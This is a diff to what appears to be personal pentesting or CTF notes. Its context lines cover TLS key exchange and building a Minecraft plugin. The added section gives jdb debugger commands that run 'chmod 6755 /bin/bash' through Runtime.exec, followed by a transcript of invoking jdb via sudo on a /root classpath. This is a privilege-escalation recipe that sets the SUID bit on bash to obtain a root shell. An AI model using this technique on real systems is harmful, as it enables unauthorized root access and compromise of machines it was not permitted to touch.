@@ -155,7 +155,7 @@ should see diffie-hellman key exchange.
 if it is not present, that means key exchange is not in use and it can be decrypted with the server's private key.
 it is not possible to disable key exchange in TLS1.3
 
-# build java minecraft plugin with maven
+# build custom java minecraft plugin with maven
 ```bash
 git clone https://github.com/joe-akeem/minecraft-plugin-template
 cd minecraft-plugin-template
@@ -164,4 +164,35 @@ cd minecraft-plugin-template
 # build
 mvn package
 # build output jar is in target/
+```
+
+# java jdb execute commands
+```
+stop on Main.main
+run
+eval java.lang.Runtime.getRuntime().exec("chmod 6755 /bin/bash");
+cont
+```
+```
+user@hostname:~$ sudo /usr/bin/jdb -classpath /root/ Main
+Initializing jdb ...
+> stop on Main.main
+Deferring breakpoint Main.main.
+It will be set after the class is loaded.
+> run
+run Main
+Set uncaught java.lang.Throwable
+Set deferred uncaught java.lang.Throwable
+>
+VM Started: Set deferred breakpoint Main.main
+
+Breakpoint hit: "thread=main", Main.main(), line=5 bci=0
+5               System.out.println("Hello World!");
+
+main[1] eval java.lang.Runtime.getRuntime().exec("chmod 6755 /bin/bash");
+ java.lang.Runtime.getRuntime().exec("chmod 6755 /bin/bash"); = "Process[pid=3332, exitValue="not exited"]"
+main[1] cont
+> Hello World!
+
+The application exited
 ```
